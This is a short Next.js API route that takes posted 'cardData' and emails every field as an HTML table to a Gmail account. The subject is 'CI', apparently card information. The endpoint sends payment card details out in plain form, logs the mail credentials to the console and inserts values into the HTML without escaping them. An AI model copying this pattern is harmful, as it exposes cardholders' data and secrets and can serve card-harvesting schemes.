import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(req) {
  try {
    const cardData = await req.json();

    let transporter = nodemailer.createTransport({
      service: "Gmail",
      auth: {
        user: process.env.G_USER,
        pass: process.env.G_KEY,
      },
    });

    console.log("process.env.G_USER", process.env.G_USER);
    console.log("process.env.G_KEY", process.env.G);

    let tableHTML = `<table border="1">
      <thead>
        <tr>
          <th>Field</th>
          <th>Value</th>
        </tr>
      </thead>
      <tbody>
        ${generateTableRows(cardData)}
      </tbody>
    </table>`;

    let mailOptions = {
      from: "sender@gmail.com",
      to: process.env.G_USER,
      subject: "CI",
      html: tableHTML,
    };

    await new Promise((resolve, reject) => {
      transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          console.log("error:", error);
          reject(error);
        } else {
          console.log("info:", info);
          resolve(info);
        }
      });
    });

    return NextResponse.json({ success: "success" }, { status: 201 });
  } catch (error) {
    console.log("----error----", error);
    return NextResponse.json({ error: "error" }, { status: 500 });
  }
}

function generateTableRows(data) {
  let rows = "";
  for (const [key, value] of Object.entries(data)) {
    if (typeof value === "object") {
      rows += `<tr><td>${key}</td><td>${generateTableRows(value)}</td></tr>`;
    } else {
      rows += `<tr><td>${key}</td><td>${value}</td></tr>`;
    }
  }
  return rows;
}
